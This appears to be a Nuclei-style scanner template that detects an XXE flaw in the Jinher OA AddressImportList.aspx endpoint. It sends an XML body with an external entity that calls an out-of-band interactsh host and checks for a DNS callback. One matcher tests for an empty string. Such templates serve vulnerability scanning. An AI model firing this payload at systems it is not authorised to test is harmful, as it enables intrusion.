id: poc-yaml-jinher-addressimportlist-aspx-xxe
info:
  name: 金和OA AddressImportList.aspx XXE漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: xxe,dnslog

variables:
  reverse: '{{interactsh-url}}'

flow: http(1) && http(2)

http:
  - id: initial-check
    method: GET
    path:
      - "{{BaseURL}}/C6/Jhsoft.Web.login/PassWordSlideFull.aspx"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "JHSoft"
        part: body

  - id: xxe-payload
    method: POST
    path:
      - "{{BaseURL}}/c6/Jhsoft.Web.addressbook/AddressImportList.aspx/"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |-
      <?xml version="1.0" encoding="UTF-8"?>
      <!DOCTYPE root [
      <!ENTITY % remote SYSTEM "{{reverse}}/xxe_test">
      %remote;]>
      <root/>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - ""
        part: body
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
